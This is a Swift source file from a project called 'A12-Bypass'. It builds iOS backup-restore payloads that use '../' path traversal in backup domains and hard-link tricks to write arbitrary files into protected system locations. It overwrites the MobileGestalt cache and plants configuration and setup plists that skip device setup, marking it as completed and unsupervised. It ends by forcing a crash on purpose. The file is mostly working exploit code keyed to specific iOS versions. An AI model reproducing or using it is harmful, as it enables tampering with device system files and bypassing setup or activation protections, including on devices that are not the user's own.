//
//  Restore.swift
//  A12-Bypass
//
//  Created by Pruebas on 09/12/24.
//

import Foundation

enum PathTraversalCapability: Int {
    case unsupported = 0 // 18.2b3+, 17.7.2
    case dotOnly // 18.1b5-18.2b2, 17.7.1
    case dotAndSlashes // up to 18.1b4, 17.7
}

class FileToRestore {
    var contents: Data
    var to: URL
    var owner, group: Int32
    
    init(from: URL, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = try! Data(contentsOf: from)
        self.to = to
        self.owner = owner
        self.group = group
    }
    
    init(contents: Data, to: URL, owner: Int32 = 0, group: Int32 = 0) {
        self.contents = contents
        self.to = to
        self.owner = owner
        self.group = group
    }
}


struct AnyCodable: Codable {
    let value: Any

    init(_ value: Any) {
        self.value = value
    }

    init(from decoder: Decoder) throws {
        let container = try decoder.singleValueContainer()
        if let intValue = try? container.decode(Int.self) {
            value = intValue
        } else if let doubleValue = try? container.decode(Double.self) {
            value = doubleValue
        } else if let stringValue = try? container.decode(String.self) {
            value = stringValue
        } else if let boolValue = try? container.decode(Bool.self) {
            value = boolValue
        } else if let arrayValue = try? container.decode([AnyCodable].self) {
            value = arrayValue.map { $0.value }
        } else if let dictValue = try? container.decode([String: AnyCodable].self) {
            value = dictValue.mapValues { $0.value }
        } else {
            throw DecodingError.dataCorruptedError(in: container, debugDescription: "Unsupported type")
        }
    }

    func encode(to encoder: Encoder) throws {
        var container = encoder.singleValueContainer()
        if let intValue = value as? Int {
            try container.encode(intValue)
        } else if let doubleValue = value as? Double {
            try container.encode(doubleValue)
        } else if let stringValue = value as? String {
            try container.encode(stringValue)
        } else if let boolValue = value as? Bool {
            try container.encode(boolValue)
        } else if let arrayValue = value as? [Any] {
            try container.encode(arrayValue.map { AnyCodable($0) })
        } else if let dictValue = value as? [String: Any] {
            try container.encode(dictValue.mapValues { AnyCodable($0) })
        } else {
            throw EncodingError.invalidValue(value, EncodingError.Context(codingPath: encoder.codingPath, debugDescription: "Unsupported type"))
        }
    }
}
struct Restore {
    static func supportedExploitLevel() -> PathTraversalCapability {
        if #available(iOS 18.1, *) {
            return .dotOnly
        } else {
            return .dotAndSlashes
        }
    }
   
    
    static func createMobileGestalt(file: FileToRestore) -> Backup {
        let cloudConfigPlist: [String : Any] = [
            "SkipSetup": ["WiFi", "Location", "Restore", "SIMSetup", "Android", "AppleID", "IntendedUser", "TOS", "Siri", "ScreenTime", "Diagnostics", "SoftwareUpdate", "Passcode", "Biometric", "Payment", "Zoom", "DisplayTone", "MessagingActivationUsingPhoneNumber", "HomeButtonSensitivity", "CloudStorage", "ScreenSaver", "TapToSetup", "Keyboard", "PreferredLanguage", "SpokenLanguage", "WatchMigration", "OnBoarding", "TVProviderSignIn", "TVHomeScreenSync", "Privacy", "TVRoom", "iMessageAndFaceTime", "AppStore", "Safety", "Multitasking", "ActionButton", "TermsOfAddress", "AccessibilityAppearance", "Welcome", "Appearance", "RestoreCompleted", "UpdateCompleted"],
            "AllowPairing": true,
            "ConfigurationWasApplied": true,
            "CloudConfigurationUIComplete": true,
            "ConfigurationSource": 0,
            "PostSetupProfileWasInstalled": true,
            "IsSupervised": false,
        ]
        let purplebuddyPlist = [
            "SetupDone": true,
            "SetupFinishedAllSteps": true,
            "UserChoseLanguage": true
        ]
        
        return Backup(files: [
            // MobileGestalt
            Directory(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcache"),
            Directory(path: "systemgroup.com.apple.mobilegestaltcache/Library", domain: "SysSharedContainerDomain-"),
            Directory(path: "systemgroup.com.apple.mobilegestaltcache/Library/Caches", domain: "SysSharedContainerDomain-"),
            ConcreteFile(
                path: "systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist",
                domain: "SysSharedContainerDomain-",
                contents: file.contents,
                owner: file.owner,
                group: file.group),
            //ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data())
            // Skip setup
            Directory(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles"),
            Directory(path: "systemgroup.com.apple.configurationprofiles/Library", domain: "SysSharedContainerDomain-"),
            Directory(path: "systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles", domain: "SysSharedContainerDomain-"),
            ConcreteFile(
                path: "systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/CloudConfigurationDetails.plist",
                domain: "SysSharedContainerDomain-",
                contents: try! PropertyListEncoder().encode(AnyCodable(cloudConfigPlist)),
                owner: 501,
                group: 501),
            ConcreteFile(
                path: "mobile/com.apple.purplebuddy.plist",
                domain: "ManagedPreferencesDomain",
                contents: try! PropertyListEncoder().encode(AnyCodable(purplebuddyPlist)),
                owner: 501,
                group: 501),
        ])
    }
    
    static func createBackupFiles(files: [FileToRestore]) -> Backup {
        // create the files to be backed up
        var filesList : [BackupFile] = [
            Directory(path: "", domain: "RootDomain"),
            Directory(path: "Library", domain: "RootDomain"),
            Directory(path: "Library/Preferences", domain: "RootDomain")
        ]
        
        // create the links
        for (index, file) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "Library/Preferences/temp\(index)",
                domain: "RootDomain",
                contents: file.contents,
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)))
        }
        
        // add the file paths
        for (index, file) in files.enumerated() {
            let restoreFilePath = file.to.path // Usa `path` en lugar de `path(percentEncoded:)`
            var basePath = "/var/backup"

            // Configura para trabajar en particiones separadas (evita un bootloop)
            if restoreFilePath.hasPrefix("/var/mobile/") {
                // Requerido en iOS 17.0+ ya que /var/mobile está en una partición separada
                basePath = "/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/mobile/") {
                basePath = "/private/var/mobile/backup"
            } else if restoreFilePath.hasPrefix("/private/var/") {
                basePath = "/private/var/backup"
            }

            let directoryPath = basePath + file.to.deletingLastPathComponent().path
            let filePath = basePath + restoreFilePath

            filesList.append(Directory(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(directoryPath)",
                owner: file.owner,
                group: file.group
            ))
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../..\(filePath)",
                contents: Data(),
                owner: file.owner,
                group: file.group,
                inode: UInt64(index)
            ))
        }

        
        // break the hard links
        for (index, _) in files.enumerated() {
            filesList.append(ConcreteFile(
                path: "",
                domain: "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp\(index)",
                contents: Data(),
                owner: 501,
                group: 501))
        }
        
        // crash on purpose
        filesList.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
        
        // create the backup
        return Backup(files: filesList)
    }
}
